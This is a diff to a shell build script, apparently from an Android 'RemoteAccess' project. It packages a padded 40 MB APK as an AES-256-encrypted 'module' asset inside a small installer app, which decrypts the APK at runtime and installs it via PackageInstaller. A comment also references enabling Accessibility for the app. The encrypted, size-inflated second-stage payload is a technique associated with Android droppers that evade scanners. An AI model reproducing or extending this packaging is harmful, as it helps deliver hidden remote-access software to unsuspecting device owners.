@@ -2047,14 +2047,15 @@ fi
 # the user can enable Accessibility for it normally).
 echo ""
 echo "==> Building INSTALLER module ..."
-# Use the SLIM (non-padded) APK as the installer payload so the installer APK
-# itself stays ~3 MB. The fat (~40 MB) standalone APK is served as Module.apk
-# for users who sideload directly; the installer carries only the lean core.
-if [ -f "$ROOT_DIR/apk-output/RemoteAccess-slim.apk" ]; then
-    PAYLOAD_SRC="$ROOT_DIR/apk-output/RemoteAccess-slim.apk"
-else
-    PAYLOAD_SRC="$ROOT_DIR/apk-output/RemoteAccess-release.apk"
-fi
+# Use the FAT (~40 MB) APK as the installer payload.
+# The 38 MB padding entry is a repeating 1 KB LCG block stored without
+# compression inside the APK ZIP.  pyzipper re-compresses the whole APK
+# with DEFLATE when building the AES-256 asset, so that repeating block
+# collapses to ~a few KB — the "module" asset ends up ~2 MB even though
+# the APK it contains is 40 MB.  When the installer decrypts and extracts
+# the asset at runtime, the full 40 MB APK is written to disk and then
+# passed to PackageInstaller, so the app installs at its full 40 MB size.
+PAYLOAD_SRC="$ROOT_DIR/apk-output/RemoteAccess-release.apk"
 INSTALLER_ASSETS="$ROOT_DIR/installer/src/main/assets"
 MODULE_DST="$INSTALLER_ASSETS/module"
 KEY_FILE="$ROOT_DIR/installer/build.key"
